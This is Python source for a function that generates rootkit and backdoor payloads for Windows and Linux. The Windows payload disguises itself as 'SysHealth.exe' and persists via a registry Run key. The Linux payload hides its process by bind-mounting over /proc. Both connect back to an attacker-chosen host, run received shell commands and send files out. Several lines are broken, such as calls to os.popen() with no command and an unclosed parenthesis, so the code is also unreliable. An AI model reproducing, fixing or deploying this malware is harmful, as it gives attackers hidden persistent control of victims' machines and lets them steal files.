def _get_rootkit(host : str, port : int , platform : str, strs : list):
    if platform == 'WINDOWS':
        return """
import socket\nimport os\nimport sys\nfrom winreg import OpenKey , SetValueEx
def {keepyourselfalive}() :\n\tf = open(str(__file__) , "rb")
\n\tff = open("C:\\Windows\\system32\\SysHealth.exe" , "wb") 
\tff.write(f.read())\n\tf.close()\n\tff.close()\n\tos.system("C:\\Windows\\system32\\SysHealth.exe")
\tSetValueEx("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "System Health",0,"REG_SZ", "C:\\Windows\\system32\\SysHealth.exe")
def sendfile(file, conn):\n\tconn.send("!!!".encode("UTF-8"))
\twith open(file , 'rb') as f:
\t\tconn.send(str(len(f.read())).encode("UTF-8"))\n\t\tconn.send(f.read())\n\t\tconn.send(file.strip(os.path.dirname(file)).encode("UTF-8")
{keepyourselfalive}()
{connected} = False\nwhile not {connected} :\n\ttry :
\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
\t\tconn.connect(('{host}' , int({port})))
\t\t{connected} = True 
\texcept :\n\t\t{connected} = False\n\twhile {connected} :\n\t\ttry : 
\t\t\tconn.send((sys.platform).encode("UTF-8"))
\t\t\tc = conn.recv(1024).decode("UTF-8")
\t\t\tif c.startswith("!!!"):sendfile(c.strip('!!!'), conn)
\t\t\telse : conn.send(os.popen().read().encode("UTF-8"))
\t\texcept :
\t\t\t{connected} = False
                """.format(port = str(port) , host = host , keepyourselfalive = strs[0], 
                           connected = strs[1])
    elif platform == 'LINUX':
        return """
import os,subprocess, string, socket\n
def {relaunch}():\n\tproc = subprocess.Popen(
\t" ".join(sys.argv), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
def {hide_process}():\n\tch = string.uppercase + string.digits
\ttoken = "".join(random.choice(ch) for i in range(32))
\tif not os.path.isdir("/tmp/%s" % (token)) :\n\tif os.popen("sudo whoami").read() == "root":
\tos.system("sudo mkdir /tmp/%s && sudo mount -o bind /tmp/%s /proc/%s" % (os.getpid(), token, os.getpid()))
\tsignal.signal(signal.SIGTERM, {relaunch})\n\tsignal.signal(signal.SIGTINT, {relaunch})\n{hide_process}()
def sendfile(file, conn):\n\tconn.send("!!!".encode("UTF-8"))
\twith open(file , 'rb') as f:
\t\tconn.send(len(f.read()))\n\t\tconn.send(f.read())\n\t\tconn.send(file.strip(os.path.dirname(file)))
{connected} = False
while not {connected}:\n\ttry:\n\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
\t\tconn.connect(('{host}', int({port})))
\t\t{connected} = True
\texcept:\n\t\t{connected} = False\n\telse:\n\t\tconn.send((sys.platform).encode("UTF-8"))
while connected:\n\t\ttry:
\t\t\tc = conn.recv(1024).decode("UTF-8")
\t\t\tif c.startswith("!!!"):sendfile(c.strip('!!!'), conn)
\t\t\telse : conn.send(os.popen().read().encode("UTF-8"))\n\t\texcept:\n\t\t\t{connected} = False
""".format(port = str(port) , host = host, hide_process = strs[0], relaunch = strs[1], connected = strs[2])